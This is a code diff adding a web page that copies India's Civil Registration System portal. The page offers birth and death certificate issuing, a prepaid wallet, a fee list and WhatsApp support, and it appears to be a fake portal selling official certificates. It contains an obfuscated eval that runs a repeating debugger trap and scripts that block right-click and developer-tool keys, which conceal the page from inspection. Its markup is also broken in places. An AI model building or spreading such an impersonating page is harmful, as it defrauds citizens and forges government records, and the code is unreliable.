@@ -1,0 +1,761 @@
+<script> location.href='../index.php'</script>   
+                 <script>
+				  alert('Please Update Your Whatsapp Number ');
+				  window.location.replace('whatsapp.php');  
+				</script>";
+                          
+             
+              
+             
+            
+            
+            
+				
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="hi" lang="hi">
+   <head>
+      <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+      <meta http-equiv="Pragma" content="no-cache">
+      <meta http-equiv="Expires" content="0">
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+      <meta name="title" content="Civil Registration System">
+      <title>Civil Registration System</title>
+      <link rel="shortcut icon" href="https://crsorgi.gov.in/web/images//favicon.ico">
+      <link rel="stylesheet" type="text/css" media="screen" href="/web/css/style.css">
+      <link rel="stylesheet" type="text/css" media="screen" href="/web/css/default.css">
+      <link rel="stylesheet" type="text/css" media="screen" href="/web/css/main.css">
+      <link rel="stylesheet" type="text/css" media="screen" href="/web/css/jquery.ui.all.css">
+      <link rel="stylesheet" type="text/css" media="screen" href="/web/css/jquery-ui-1.10.0.custom.css">
+      <link rel="stylesheet" type="text/css" media="screen" href="/web/css/jquery.ui.base.css">
+      <script type="text/javascript" src="/web/js/mm_menu.js"></script>
+      <script type="text/javascript" src="/web/js/jquery-1.9.0.js"></script>
+      <script type="text/javascript" src="/web/js/jquery-ui-1.10.0.custom.js"></script>
+      <script type="text/javascript" src="/web/js/json_parse.js"></script>
+      <script type="text/javascript" src="/web/js/jquery.ui.core.js"></script>
+      <script type="text/javascript" src="/web/js/jquery.ui.datepicker-new.js"></script>
+      <script type="text/javascript" src="/web/js/jquery.ui.widget.js"></script>
+      <script type="text/javascript" src="/web/js/jquery.validate.js"></script>
+      <script type="text/javascript" src="/web/js/unicef.js"></script>
+      <script type="text/javascript" src="/web/js/jquery.blockUI.js"></script>
+      <script>
+         //javascript:alert(document.cookie='PREF=X;path=/;domain=.google.com;expires=Sat, 01-Jan-2000 00:00:00 GMT');
+         	
+    
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+      <script language="JavaScript">
+         var message="Right Click Function Disabled!";
+         
+         function clickIE4(){
+         if (event.button==2){
+         alert(message);
+         return false;
+         }
+         }
+         
+         function clickNS4(e){
+         if (document.layers||document.getElementById&&!document.all){
+         if (e.which==2||e.which==3){
+         alert(message);
+         return false;
+         }
+         }
+         }
+         
+         if (document.layers){
+         document.captureEvents(Event.MOUSEDOWN);
+         document.onmousedown=clickNS4;
+         }
+         else if (document.all&&!document.getElementById){
+         document.onmousedown=clickIE4;
+         }
+         
+         document.oncontextmenu=new Function("alert(message);return false")
+         
+      </script>
+      <script>
+         document.onkeydown = function(e) {
+           if(event.keyCode == 123) {
+              return false;
+           }
+           if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+              return false;
+           }
+           if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
+              return false;
+           }
+           if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+              return false;
+           }
+           if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+              return false;
+           }
+         }
+      </script>
+      <script type="text/javascript">
+         eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(3(){(3 a(){8{(3 b(2){7((\'\'+(2/2)).6!==1||2%5===0){(3(){}).9(\'4\')()}c{4}b(++2)})(0)}d(e){g(a,f)}})()})();',17,17,'||i|function|debugger|20|length|if|try|constructor|||else|catch||5000|setTimeout'.split('|'),0,{}))
+      </script>
+      <!-- Google Analytics code START 29122015 -->
+      <!--<script async src="https://www.googletagmanager.com/gtag/js?id=G-5PT57SMG05" integrity="sha256-WgOvZ8UHNhkJlfDCu+OIO7W4+W8qznch7gOeECyHySs=" crossorigin="anonymous"></script>-->
+      <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-5PT57SMG05"></script>
+      <script>
+         /* (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+          })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+         
+          ga('create', 'UA-61961116-1', 'auto');
+          ga('send', 'pageview');*/
+         
+         window.dataLayer = window.dataLayer || [];
+         function gtag(){dataLayer.push(arguments);}
+         gtag('js', new Date());
+         
+         gtag('config', 'G-5PT57SMG05');
+         
+      </script>
+      <!-- Google Analytics code END -->
+
+   <!--xml:lang="en" lang="en"-->
+            <meta http-equiv="Content-Language" content="hi">
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+    
+   
+  <style type="text/css">* {<br>		-webkit-user-select: text !important;<br>		-moz-user-select: text !important;<br>		-ms-user-select: text !important;<br>		 user-select: text !important;<br>	}</style><style type="text/css">* {<br>        -webkit-user-select: text !important;<br>        -moz-user-select: text !important;<br>        -ms-user-select: text !important;<br>         user-select: text !important;<br>    }</style></head>
+  <body style="zoom: 1;">
+   
+</div><table width="100%" border="0" cellspacing="0" cellpadding="0">
+	  
+
+      
+<tbody><tr style="padding: 0px !important; margin: 0px !important; line-height: 0px !important; float: left !important; height: 0px !important;">
+	<td>
+	<style>
+	
+	 .s-menu{
+		visibility: hidden;
+		position: absolute;
+		right: -113px;
+		margin-top: -25px;
+		padding-left: 0px;
+	}
+	
+	</style>
+	
+	
+	
+		<script type="text/javascript">
+		<!--
+		var timeout = 500;
+		var closetimer = 0;
+		var ddmenuitem = 0;
+
+		// open hidden layer
+		function mopen(id) {
+			// cancel close timer
+			mcancelclosetime();
+			// close old layer
+			if (ddmenuitem)
+			ddmenuitem.style.visibility = 'hidden';
+			// get new layer and show it
+			ddmenuitem = document.getElementById(id);
+			ddmenuitem.style.visibility = 'visible';
+		}
+		// close showed layer
+		function mclose() {
+			if (ddmenuitem)
+			ddmenuitem.style.visibility = 'hidden';
+		}
+
+		// go close timer
+		function mclosetime() {
+			closetimer = window.setTimeout(mclose, timeout);
+		}
+
+		// cancel close timer
+		function mcancelclosetime() {
+			if (closetimer) {
+				window.clearTimeout(closetimer);
+				closetimer = null;
+			}
+		}
+		// close layer when click-out
+		document.onclick = mclose;
+		// -->
+		</script>
+		
+		<script type="text/javascript">
+		<!--
+		var timeout1 = 500;
+		var closetimer1 = 0;
+		var ddmenuitem1 = 0;
+
+		// open hidden layer
+		function mopen1(id) {
+			// cancel close timer
+			mcancelclosetime1();
+			// close old layer
+			if (ddmenuitem1)
+			ddmenuitem1.style.visibility = 'hidden';
+			// get new layer and show it
+			ddmenuitem1 = document.getElementById(id);
+			ddmenuitem1.style.visibility = 'visible';
+		}
+		// close showed layer
+		function mclose1() {
+			if (ddmenuitem1)
+			ddmenuitem1.style.visibility = 'hidden';
+		}
+
+		// go close timer
+		function mclosetime1() {
+			closetimer1 = window.setTimeout(mclose1, timeout1);
+		}
+
+		// cancel close timer
+		function mcancelclosetime1() {
+			if (closetimer1) {
+				window.clearTimeout(closetimer1);
+				closetimer1 = null;
+			}
+		}
+		// close layer when click-out
+		document.onclick = mclose1;
+		// -->
+		</script>
+		
+	</td>
+</tr>
+<tr>
+	<td class="header-top-strip">
+		<div id="head">
+			<div class="logo">
+			<!--	<a href="index.php"><img alt="" title="" border="0" width="297" height="125" src="/web/images/logo-top.jpg"></a>		 -->	</div>
+			<div style="position: absolute; right: 20px; top: 20px;">
+							</div>
+
+
+			<div style="position: absolute; right: 0px; top: 85px;">
+				<ul id="sddm" style="margin:11px 1px 0px 0px !important;">
+					
+											<li><a href="index.php">HOME</a> </li>
+						  <li>
+                           <a href="javascript:void(0);" onmouseover="mopen('m6')" onmouseout="mclosetime()"> DC BIRTH</a>										
+                           <div id="m6" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+                               <a href="dc_birth.php">APPLY</a>    <a href="dc_birthlist.php">LIST PRINT </a> <a href="dc_bihar.php">ONLY ENGISH LIST (BIHAR)  </a>																							
+                           </div>
+                        </li>
+                        <li>
+                           <a href="javascript:void(0);" onmouseover="mopen('m7')" onmouseout="mclosetime()"> DC DEATH</a>										
+                           <div id="m7" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+                               <a href="dc_death.php">APPLY</a>    <a href="dc_death_list.php">LIST PRINT</a> <a href="dc_english.php">ONLY ENGISH LIST (BIHAR)</a>
+                                
+                           </div>
+                        </li>
+							 
+
+							<!--Added code for Regitrar for given the provision of Downloading csv file on 23102015-->
+
+															
+									
+									<!--End code-->
+
+
+																		
+									
+																																			
+																																											<!--End code-->
+
+
+																																																																																								<li><a href="javascript:void(0);" onmouseover="mopen('m1')" onmouseout="mclosetime()">BIRTH</a>																																														<div id="m1" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+																																															 <a href="birthRegister.php">HINDI OR OTHER LANGUAGE</a>  <a href="birthmanual.php"> ENGLISH BIRTH REGISTATION</a> <a href="birthmanuallist2.php">BIRTH PRINT</a>																																																																																																																																																																																																			
+																																																																																																																																																																																																
+
+																																																																																																																																																																																																																																																																																																																																																			
+
+
+																																																	
+
+																																																																																																																																																										</div>
+																																																		</li>
+																																																																																																																																																																																																															<li><a href="javascript:void(0);" onmouseover="mopen('m2')" onmouseout="mclosetime()">DEATH</a>																																																						 <div id="m2" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+                               <a href="deathRegister.php">HINDI OR OTHER LANGUAGE</a> <a href="deathmanual.php">DEATH ENGLISH REGISTRATION</a><a href="deathmanuallist2.php">DEATH PRINT</a>						
+                           </div>
+																																																											</li>
+    																																											<li>
+
+                                                                        <a href="javascript:void(0);" onmouseover="mopen('m5')" onmouseout="mclosetime()">HOSPITAL MASTER</a>
+
+									
+									
+										<!--<a href="javascript:void(0);" onmouseover="mopen('m5')" onmouseout="mclosetime()">Master</a>-->
+																									<div id="m5" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+																																																																																																																																																																																																																																																										<a href="birthform.php">BIRTH HOSPITAL ADD</a>						<a href="deathform.php">DEATH HOSPITAL ADD</a> <a href="birthformhindi.php">BIRTH ADD (ADVANCE)</a>						<a href="deathformhindi.php">DEATH ADD (ADVANCE) </a>																																								
+																																																																													
+																																																															
+																																							
+																																							
+																																							
+				
+																																	<li><a href="javascript:void(0);" onmouseover="mopen('m4')" onmouseout="mclosetime()">USER MANAGEMENT</a>																																								<div id="m4" onmouseover="mcancelclosetime()" onmouseout="mclosetime()" style="visibility: hidden;">
+<!--added code priyanka 23-08-2021 -->					
+			
+			<a href="add-user.php">NEW USER REGISTER</a>			
+											
+			<a href="userlist.php">USER LIST</a>			
+								
+			 			 
+										</div>
+	</li>
+																																									
+																																										<!--Added code by ALi for Payment Seprate Modules-->
+
+																																										
+																																											<li><a href="javascript:void(0);" onmouseover="mopen('admin')" onmouseout="mclosetime()">PAYMENT</a>
+																																												<div id="admin" onmouseover="mcancelclosetime()" onmouseout="mclosetime()" style="visibility: hidden;"
+																																													<!--====NEED TO CHANGE THIS LATER WITH PROPER PAGE LINKS=====-->
+																																													<a style="border-bottom: none;" href="wallet.php">ADD WALLET ONLINE</a>  <a style="border-bottom: none;" href="balence.php">BALANCE CHEAK</a><a style="border-bottom: none;" href="transactions.php">TRANSACTION LIST</a>
+                               <a style="border-bottom: none;" href="Tran_transactions.php">RECHARGE LIST</a>																																									</div>
+																																											</li>
+																																																																																																																																																												<li><a href="javascript:void(0);" onmouseover="mopen('m3')" onmouseout="mclosetime()">PROFILE</a>																																																															<div id="m3" onmouseover="mcancelclosetime()" onmouseout="mclosetime()" style="visibility: hidden;">
+<a href="changePassword.php">CHANGE PASSWORD</a>			<a href="profile.php"> PROFILE</a>	   																																																																																																																																																																																																																															
+
+
+																													
+																																				
+																																																																	
+
+																																																																																																																																																																																																																																																																																																																																																																																																														</div>
+																																																																		</li>
+																																																																		
+																																																																																																																																																																																						
+																																																																																	<li><a style="border:none;pointer-events: auto;" href="logout.php">LOGOUT</a></li>
+																																																																																</ul>
+																																																																															</div>
+																																																																														</div>
+																																																																													</td>
+																																																																												</tr>
+																																																																												<script type="text/javascript">
+																																																																												$(document).ready(function () {
+
+																																																																													$("#mor>a").click(function (e) {
+																date_default_timezone_set("Asia/Kolkata");																															var currtime = "1663086217";
+																																																																														var starttime = "1663047000";
+																																																																														var endtime = "1663057800";
+																																																																														var userState = "9";
+																																																																														if ((currtime >= starttime) && (currtime <= endtime)) {
+																																																																															alert("Reports can not be accessed between 11 AM To 2 PM ");
+																																																																															return false;
+																																																																														}
+																																																																													});
+																																																																													var offlineVsOnlineFlag = "";
+																																																																													//    console.log(offlineVsOnlineFlag)
+																																																																													if (offlineVsOnlineFlag == 0) {
+																																																																														$(".online").css({
+																																																																															'display': 'none'
+																																																																														});
+																																																																													}
+																																																																													else if (offlineVsOnlineFlag == 1) {
+																																																																														$(".offlineOption").css({
+																																																																															'display': 'none'
+																																																																														});
+																																																																													}
+																																																																												});
+
+                                                                                                                                                                                                                                                                                                                function Export_to_Excel_box_birth() {
+
+
+                                                                                                                                                                                                                                                                                                                    var frmdt = $('#datepicker').val();
+                                                                                                                                                                                                                                                                                                                    var todt = $('#datepicker1').val();
+
+                                                                                                                                                                                                                                                                                                                    if(!frmdt || !todt){
+
+                                                                                                                                                                                                                                                                                                                        alert('Please Select Date  !!');
+
+                                                                                                                                                                                                                                                                                                                    }
+
+                                                                                                                                                                                                                                                                                                                    else{
+
+                                                                                                                                                                                                                                                                                                                        $("#pdf_excel").css('display','none');
+                                                                                                                                                                                                                                                                                                                        $("#popupbox").css('display','none');
+                                                                                                                                                                                                                                                                                                                        $("#fadebox").css('display','none');
+                                                                                                                                                                                                                                                                                                                        $('#datepicker').val('');
+                                                                                                                                                                                                                                                                                                                        $('#datepicker1').val('');
+
+                                                                                                 $(this).css("display","none");                                                                                                                                                                                                                       window.location = "/web/index.php/birth/BirthExportReportCR/frmdt/"+frmdt+"/todt/"+todt;
+                                                                                                                                                                                                                                                                                                                    }
+                                                                                                                                                                                                                                                                                                                }                                                                                                                                                                                                                                      function Export_to_Excel_box_death()
+                                                                                                                                                                                                                                                                                                                {
+
+                                                                                                                                                                                                                                                                                                                    var frmdt = $('#datepicker2').val();
+                                                                                                                                                                                                                                                                                                                    var todt = $('#datepicker3').val();
+
+                                                                                                                                                                                                                                                                                                                    if(!frmdt || !todt){
+
+                                                                                                                                                                                                                                                                                                                        alert('Please Select Date  !!');
+
+                                                                                                                                                                                                                                                                                                                    }
+
+                                                                                                                                                                                                                                                                                                                    else{
+
+                                                                                                                                                                                                                                                                                                                        $("#pdf_excel").css('display','none');
+                                                                                                                                                                                                                                                                                                                        $("#popupbox").css('display','none');
+                                                                                                                                                                                                                                                                                                                        $("#fadebox").css('display','none');
+                                                                                                                                                                                                                                                                                                                        $('#datepicker2').val('');
+                                                                                                                                                                                                                                                                                                                        $('#datepicker3').val('');
+
+                                                                                                                                                                                                                                                                                                                        $(this).css("display","none");                                                                                                                                            window.location = "/web/index.php/death/DeathExportReportCR/frmdt/"+frmdt+"/todt/"+todt;
+                                                                                                                                                                                                                                                                                                                    }
+                                                                                                                                                                                                                                                                                                                }                                                                                                                                                                                                                                                                                                              </script>
+
+
+
+
+<!-- birth,death,stillbirth reports calender--> 
+
+																																																																												
+																																																																												
+<!--birth start-->	
+<style>
+    .fixed_modal{position: fixed; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 99; display:none;}
+	.fixed_modal1{position: fixed; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 99; display:none;}
+</style>
+
+
+
+
+		<!-- birth end-->
+
+      <tr>
+<td valign="middle" class="welcome-strip-bg" style="border: none !important;">
+ <table cellspacing="0" cellpadding="0" border="0" align="center" width="96%">
+ <tbody><tr>
+   <td align="left" width="46%" class="welcome-clock">
+   	<div class="datetime">
+<span id="live_date">Tuesday, September 13, 2022</span>
+<span id="live_clock">22:00:32 IST </span>
+</div>
+
+<script type="text/javascript">
+var lcl = new Date();
+function synctime(x){
+ lcl = new Date(x);
+}
+
+    function shdate(){
+      if (!document.layers && !document.all && !document.getElementById)
+        return;
+        mnth = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+        day_name=new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");
+        var dayname = day_name[lcl.getDay()];
+        var dd=lcl.getDate();
+        var mm=lcl.getMonth();
+        var yy=lcl.getFullYear();
+        //dtdp = dd+" "+mnth[mm]+" "+yy+", ";
+        dtdp = dayname +", "+mnth[mm]+" "+dd+", "+yy+", ";
+       dtdp = dayname +", "+mnth[mm]+" "+dd+", "+yy+", ";
+
+        if (document.layers)
+        {
+            document.layers.live_date.document.write(dtdp);
+            document.layers.live_date.document.close();
+        }
+        else if (document.all)
+        {
+            live_date.innerHTML=dtdp;
+        }
+        else if (document.getElementById)
+        {
+            document.getElementById("live_date").innerHTML=dtdp;
+        }
+    }
+
+    function show5()
+    {
+        if (!document.layers && !document.all && !document.getElementById)
+        return;
+
+        lcl.setSeconds(lcl.getSeconds()+1);
+
+        var hours=lcl.getHours();
+        var minutes=lcl.getMinutes();
+        var seconds=lcl.getSeconds();
+        var dn="PM";
+
+        if (minutes<=9)
+        minutes="0"+minutes;
+        if (seconds<=9)
+        seconds="0"+seconds;
+
+        myclock=hours+":"+minutes+":"+seconds+" IST ";
+
+    if (document.layers)
+    {
+        document.layers.live_clock.document.write(myclock);
+        document.layers.live_clock.document.close();
+    }
+    else if (document.all)
+    {
+        live_clock.innerHTML=myclock;
+    }
+    else if (document.getElementById)
+    {
+        document.getElementById("live_clock").innerHTML=myclock;
+    }
+
+        setTimeout("show5()", 1000);
+    }
+
+shdate();
+show5();
+</script>   </td>
+    </script>   </td>
+    <td class="welcome-clock" colspan="2" align="right">
+  	 <label class="welcome-welcome"> WELCOME : -  </label>
+          (Registrar)
+         
+         
+         
+         
+    
+   		<!-- <span style="font-weight:normal;">Registration Unit No :</span>  -->
+   	 </label>
+   </td>
+ </tr></tbody>
+ </table>
+</td>
+</tr>
+<tr><td>&nbsp;</td></tr> 
+                <!-- display errot msg -->
+<!-- ends -->
+<tr>
+  <td align="center" valign="top"><table width="96%" border="0" cellspacing="0" cellpadding="0">
+      <tbody><tr>
+        <td width="219" valign="top" class="left-menu-panel">
+                    <table width="100%" border="0" cellspacing="0" cellpadding="0">
+  <tbody><tr>
+    <td width="204" height="0"></td>
+  </tr>
+  <tr>
+   
+    <td align="center" valign="middle" class="block-title">CUSTOMER SUPPORT WHATSAPP</td>
+    
+  </tr>
+  <tr>
+  <td width="219" valign="top" class="left-menu-panel" align="center">
+	    <br> <b>Your Wallet Balance<b> <br> <br> <br><br>
+					
+		       
+      </td>
+    
+  </tr>
+       
+                                                      
+     
+
+  <tr>
+      
+    <td>
+      <div class="left-menu">
+        <ul>
+<!--          <li></li>-->
+
+
+<style>
+.not-active {
+   pointer-events: none;
+   cursor: default;
+}
+</style>
+
+           <div id="mor1" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+		          
+                     
+          <!-- Added by Ali on National Admin, District Registar ans Chief registar-->
+                    
+          <!--others Display-->
+                   
+		  
+		
+		
+	
+		               
+				   <!--<li><a href="https://103.151.152.76/web/index.php/qrcode/changeQr" >Update QR Code</a></li>-->
+				    		 
+             
+        </ul>
+      </div>			
+    </td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+  </tbody></table>                  </td>
+        <td width="12">&nbsp;</td>
+        <td style="float:left; height: 24px; width: 100%;">
+      <marquee behavior="scroll" direction="left" scrollamount="3" title="Latest News" onmouseover="this.stop();" onmouseout="this.start();" style="
+               background: #FFF; height: 17px; line-height: 6px;">
+        
+      </marquee>
+      </td>
+      
+      <td width="100%" align="center" style="float:left" valign="top">
+      <div style="background-color: #F1F1F1; height: 350px;">
+	  <!-- display success msg -->
+          <!--  	<center>	<img alt="" title="" width="260" height="260" style="margin-top: 14px;" src="/web/images/water-mark.gif"></center>	-->	
+      </div>
+      </td>
+      <td width="10">&nbsp;</td>
+      <td width="219" valign="top" class="left-menu-panel" align="center">
+	    <br><b>Certificate Charge List<br> <br>DC Birth - 30<br>DC Death - 30<br><br> Birth English - 20<br>Birth Hindi - 20<br><br>Death English - 20<br>Death Hindi - 20<br><br>Certificate Edit Charge<br> Birth or Death - 0 <b>
+	  	<br><br> 		
+					
+		        <!--// Added by Naveen 30-03-2016 7:39 pm (start)-->
+                <br><br>		
+                <div id="mor" onmouseover="mcancelclosetime()" onmouseout="mclosetime()">
+       	</div>
+                <!--// Added by Naveen 30-03-2016 7:39 pm (end)-->
+		<br><br><br>
+		       
+      
+    
+      </td>
+</tr>
+</tbody></table></td>
+</tr>
+<tr>
+  <td>&nbsp;</td>
+</tr>
+<script type="text/javascript">
+            function loadPage(dd, k){
+                var url = "/web/index.php/default/home/page/"+dd+"/k/="+k;
+                window.location = url; 
+            }
+      
+        </script>
+
+		<!-- added by priyanka 24-08-2021 --> 
+  
+  
+  <script src="https://code.jquery.com/jquery-1.12.4.js" integrity="sha256-Qw82+bXyGq6MydymqBxNPYTaUXXq7c8v3CwiYwLLNXU=" crossorigin="anonymous"></script>
+  <script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js" integrity="sha256-T0Vest3yCU7pafRw9r+settMBX6JkKN06dqBnpQ8d30=" crossorigin="anonymous"></script>
+
+
+<!--added by priyanka 24-08-2021 -->
+	
+	
+<!--code end -->
+<!--Added by nagendra 24-08-2021 -->
+<!--<div class="fixed_modal_alert" style="display:none;">
+<div id="dialog-message" title="Password Change Reminder" style="color:red">
+  <p>
+    <span class="ui-icon ui-icon-circle-check" style="float:left; margin:0 7px 50px 0;"></span>
+    <b>You have not changed your password in last <br/>75 days. Please change your password.</b>
+  </p>
+  
+</div>
+</div>	-->
+<!--code end -->
+		
+		
+		<script type="text/javascript">
+    $(document).ready(function () {
+
+        $("#mor").click(function () {
+			date_default_timezone_set("Asia/Kolkata");
+            var currtime = "1663086217";
+            var starttime = "1663066800";
+            var endtime = "1663077600";
+            var userState = "";
+            if ((currtime >= starttime) && (currtime <= endtime)) {
+                alert("Reports can not be accessed between 11 AM To 2 PM ");
+                return false;
+            }
+        });
+		
+		$("#mor1").click(function () {
+			date_default_timezone_set("Asia/Kolkata");
+            var currtime = "1663086217";
+            var starttime = "1663066800";
+            var endtime = "1663077600";
+            var userState = "";
+            if ((currtime >= starttime) && (currtime <= endtime)) {
+                alert("Reports can not be accessed between 11 AM To 2 PM ");
+                return false;
+            }
+        });
+
+		  });
+		 </script>
+		 
+				 
+		
+		       
+<tr>
+    <td align="center" valign="middle" class="footer-content-strip">
+            The Registrar General &amp; Census Commissioner, India © 2022    </td>
+</tr>
+<tr><td class="footer-border" style="line-height: 5px; padding: 2px !important;"></td></tr>
+
+    </tbody></table>
+  
+
+<script type="text/javascript">
+		document.oncontextmenu = null;
+		document.onselectstart = null;
+		document.ondragstart = null;
+		document.onmousedown = null;
+		document.body.oncontextmenu = null;
+		document.body.onselectstart = null;
+		document.body.ondragstart = null;
+		document.body.onmousedown = null;
+		document.body.oncut = null;
+		document.body.oncopy = null;
+		document.body.onpaste = null;
+	</script></body></html>
+	
+		<!-- font awesome -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+    
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+    	
+       
+       
+
+<style>
+       /* for desktop */
+      .whatsapp_float {
+          position: fixed;
+          width: 60px;
+          height: 60px;
+          bottom: 40px;
+          right: 40px;
+          background-color: #25d366;
+          color: #FFF;
+          border-radius: 50px;
+          text-align: center;
+          font-size: 30px;
+          box-shadow: 2px 2px 3px #999;
+          z-index: 100;
+      }
+
+      .whatsapp-icon {
+          margin-top: 16px;
+      }
+
+      /* for mobile */
+      @media screen and (max-width: 767px) {
+          .whatsapp-icon {
+              margin-top: 10px;
+          }
+
+          .whatsapp_float {
+              width: 40px;
+              height: 40px;
+              bottom: 20px;
+              right: 10px;
+              font-size: 22px;
+          }
+      }
+
+</style>
